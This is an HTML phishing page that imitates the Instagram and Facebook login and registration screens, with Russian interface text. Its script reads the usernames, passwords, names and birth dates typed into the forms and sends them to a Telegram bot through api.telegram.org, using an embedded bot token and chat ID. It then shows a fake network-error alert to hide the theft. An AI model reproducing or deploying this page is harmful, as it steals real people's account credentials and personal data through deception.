<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- Brauzer tabidagi logotipni to'g'irlash (image_751926.png uchun) -->
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a51483e1.png">
    
    <style>
        /* Umumiy sozlamalar */
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow-x: hidden; }
        .wrapper { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        .hidden { display: none !important; }

        /* --- INSTAGRAM DARK THEME (image_75773b.png & image_7576fb.png) --- */
        .insta-bg { background-color: #000000; color: #ffffff; }
        .insta-container { width: 100%; max-width: 350px; text-align: center; margin-top: 40px; }
        .insta-logo { width: 175px; margin-bottom: 35px; filter: invert(1); } 
        .insta-header { font-size: 16px; font-weight: 600; margin-bottom: 25px; }
        
        .input-box { 
            width: 100%; background: #121212; border: 1px solid #363636; 
            border-radius: 12px; color: #ffffff; padding: 14px; 
            margin-bottom: 12px; font-size: 14px; 
        }
        .input-box::placeholder { color: #8e8e8e; }
        .input-box:focus { border-color: #555; outline: none; }

        .btn-blue { 
            width: 100%; background-color: #0095f6; border: none; 
            border-radius: 25px; color: white; font-weight: 600; 
            padding: 12px; font-size: 15px; cursor: pointer; margin-top: 10px;
        }

        .insta-link { color: #ffffff; font-size: 14px; text-decoration: none; display: block; margin-top: 25px; font-weight: 500; }
        .btn-outline { 
            width: 100%; background: none; border: 1px solid #363636; 
            color: #ffffff; border-radius: 25px; padding: 10px; 
            margin-top: 15px; font-size: 14px; font-weight: 500; cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }

        /* --- FACEBOOK LIGHT THEME (image_7573d9.png & image_757359.png) --- */
        .fb-bg { background-color: #ffffff; color: #1c1e21; }
        .fb-container { width: 100%; max-width: 400px; text-align: center; margin-top: 50px; }
        .fb-logo-text { width: 120px; margin-bottom: 30px; }
        .fb-title { text-align: left; font-size: 20px; font-weight: 700; margin-bottom: 25px; }
        
        .fb-input { 
            width: 100%; background: #f5f6f7; border: 1px solid #dddfe2; 
            border-radius: 12px; padding: 16px; margin-bottom: 12px; font-size: 16px; color: #1c1e21;
        }

        .fb-btn-reg { 
            background: none; border: 1px solid #0064e0; color: #0064e0; 
            border-radius: 25px; width: 100%; padding: 10px; 
            font-weight: 600; margin-top: 40px; cursor: pointer;
        }

        /* Footer */
        .footer { margin-top: auto; padding-bottom: 30px; text-align: center; }
        .meta-text { font-size: 12px; color: #8e8e8e; font-weight: bold; letter-spacing: 1px; }
    </style>
</head>
<body class="insta-bg">

<!-- INSTAGRAM LOGIN (image_75773b.png) -->
<div id="p1" class="wrapper">
    <div class="insta-container">
        <img src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" class="insta-logo">
        <div class="insta-header">Войти в Instagram</div>
        <input type="text" id="i_l_u" class="input-box" placeholder="Имя пользователя, номер или email">
        <input type="password" id="i_l_p" class="input-box" placeholder="Пароль">
        <button class="btn-blue" onclick="sendData('Insta Login', ['i_l_u', 'i_l_p'])">Войти</button>
        <a href="#" class="insta-link">Забыли пароль?</a>
        
        <div style="margin-top: 40px; width: 100%;">
            <button class="btn-outline" onclick="showPage('p3')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
                Войти через Facebook
            </button>
            <button class="btn-outline" style="color: #0095f6; border-color: #0095f6;" onclick="showPage('p2')">Создать новый аккаунт</button>
        </div>
    </div>
    <div class="footer"><div class="meta-text">∞ Meta</div></div>
</div>

<!-- INSTAGRAM REGISTER (image_7576fb.png) -->
<div id="p2" class="wrapper hidden">
    <div class="insta-container" style="text-align: left;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" width="20" style="filter: invert(1);">
            <span style="font-weight: bold; font-size: 14px;">Meta</span>
        </div>
        <h2 style="font-size: 24px; margin: 0;">Зарегистрируйтесь</h2>
        <p style="color: #8e8e8e; font-size: 14px; margin: 8px 0 25px 0;">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>

        <input type="text" id="i_r_c" class="input-box" placeholder="Моб. номер или электронный адрес">
        <input type="password" id="i_r_p" class="input-box" placeholder="Пароль">
        
        <div style="margin: 15px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
            <select id="d" class="input-box" style="margin:0"></select>
            <select id="m" class="input-box" style="margin:0"></select>
            <select id="y" class="input-box" style="margin:0"></select>
        </div>

        <input type="text" id="i_r_n" class="input-box" placeholder="Имя и фамилия">
        <input type="text" id="i_r_u" class="input-box" placeholder="Имя пользователя">
        <button class="btn-blue" style="border-radius: 10px;" onclick="sendData('Insta Reg', ['i_r_c', 'i_r_p', 'd', 'm', 'y', 'i_r_n', 'i_r_u'])">Регистрация</button>
        <div style="text-align: center; margin-top: 20px;"><span style="color: #8e8e8e; font-size: 14px; cursor: pointer;" onclick="showPage('p1')">У меня уже есть аккаунт</span></div>
    </div>
</div>

<!-- FACEBOOK LOGIN (image_7573d9.png) -->
<div id="p3" class="wrapper fb-bg hidden">
    <div class="fb-container">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8ch_E4.svg" class="fb-logo-text">
        <div class="fb-title">Войдите на Facebook</div>
        <input type="text" id="f_l_u" class="fb-input" placeholder="Электронный адрес или номер телефона">
        <input type="password" id="f_l_p" class="fb-input" placeholder="Пароль">
        <button class="btn-blue" style="font-size: 18px; padding: 14px; border-radius: 8px;" onclick="sendData('FB Login', ['f_l_u', 'f_l_p'])">Войти</button>
        <a href="#" class="insta-link" style="color: #1c1e21; font-weight: 500;">Забыли пароль?</a>
        <button class="fb-btn-reg" onclick="showPage('p4')">Создать новый аккаунт</button>
    </div>
    <div class="footer"><div class="meta-text" style="color: #606770;">∞ Meta</div></div>
</div>

<!-- FACEBOOK REGISTER (image_757359.png) -->
<div id="p4" class="wrapper fb-bg hidden">
    <div class="fb-container" style="text-align: left;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="24">
            <span style="font-weight: bold; font-size: 14px;">Meta</span>
        </div>
        <h2 style="font-size: 22px; margin: 0;">Начните пользоваться Facebook</h2>
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <input type="text" id="f_r_n" class="fb-input" placeholder="Имя">
            <input type="text" id="f_r_s" class="fb-input" placeholder="Фамилия">
        </div>
        <div style="margin: 10px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
            <select id="fd" class="fb-input" style="margin:0; padding: 10px;"></select>
            <select id="fm" class="fb-input" style="margin:0; padding: 10px;"></select>
            <select id="fy" class="fb-input" style="margin:0; padding: 10px;"></select>
        </div>
        <input type="text" id="f_r_c" class="fb-input" placeholder="Номер мобильного или email">
        <input type="password" id="f_r_p" class="fb-input" placeholder="Пароль">
        <button class="btn-blue" style="padding: 14px; border-radius: 8px;" onclick="sendData('FB Reg', ['f_r_n', 'f_r_s', 'fd', 'fm', 'fy', 'f_r_c', 'f_r_p'])">Отправить</button>
        <div style="text-align: center; margin-top: 20px; color: #0064e0; font-weight: 600; cursor: pointer;" onclick="showPage('p3')">У меня уже есть аккаунт</div>
    </div>
</div>

<script>
    const TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    function showPage(id) {
        document.querySelectorAll('.wrapper').forEach(p => p.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
        document.body.className = (id === 'p3' || id === 'p4') ? 'fb-bg' : 'insta-bg';
    }

    function fillDates() {
        const d_els = document.querySelectorAll('#d, #fd'), m_els = document.querySelectorAll('#m, #fm'), y_els = document.querySelectorAll('#y, #fy');
        const months = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
        d_els.forEach(el => { for(let i=1; i<=31; i++) el.innerHTML += `<option>${i}</option>`; });
        m_els.forEach(el => { months.forEach(m => el.innerHTML += `<option>${m}</option>`); });
        y_els.forEach(el => { for(let i=2026; i>=1950; i--) el.innerHTML += `<option>${i}</option>`; });
    }
    fillDates();

    async function sendData(type, ids) {
        let message = `🚀 *Yangi Login: ${type}*\n\n`;
        let valid = true;
        ids.forEach(id => {
            const val = document.getElementById(id).value;
            if(!val) valid = false;
            message += `📍 *${id}:* \`${val}\`\n`;
        });
        if(!valid) return alert("Iltimos, barcha maydonlarni to'ldiring!");

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
            alert("Ошибка сети (404). Пожалуйста, проверьте интернет-соединение.");
        } catch(e) {
            console.error(e);
        }
    }
</script>
</body>
</html>
